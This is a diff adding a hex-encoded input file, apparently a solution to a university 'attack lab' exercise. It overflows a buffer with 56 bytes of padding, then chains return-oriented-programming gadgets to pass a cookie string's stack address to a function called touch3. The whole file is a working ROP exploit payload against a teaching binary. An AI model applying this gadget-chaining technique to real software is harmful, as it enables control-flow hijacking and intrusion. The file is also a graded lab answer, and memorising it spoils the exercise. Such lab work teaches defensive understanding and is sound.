@@ -1,0 +1,18 @@
+00 00 00 00 00 00 00 00 /* pad with 0x38 bytes = 56 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d2 18 40 00 00 00 00 00 /* gadget 1: mov %rsp, %rax */
+77 18 40 00 00 00 00 00 /* gadget 2: mov %rax, %rdi */
+71 18 40 00 00 00 00 00 /* gadget 3: pop %rax */
+48 00 00 00 00 00 00 00 /* distance between the first line(mov %rsp, %rax) to cookie string line - 1(the address offset) */
+68 19 40 00 00 00 00 00 /* gadget 4: mov %eax, %ecx */
+f4 18 40 00 00 00 00 00 /* gadget 5: mov %ecx, %edx */
+02 19 40 00 00 00 00 00 /* gadget 6: mov %edx, %esi */
+8f 18 40 00 00 00 00 00 /* gadget 7: lea (%rdi,%rsi,1),%rax */
+77 18 40 00 00 00 00 00 /* gadget 8: mov %rax, %rdi */
+c6 17 40 00 00 00 00 00 /* touch3 address */
+34 66 33 66 66 33 64 31 /* cookie string as hex */
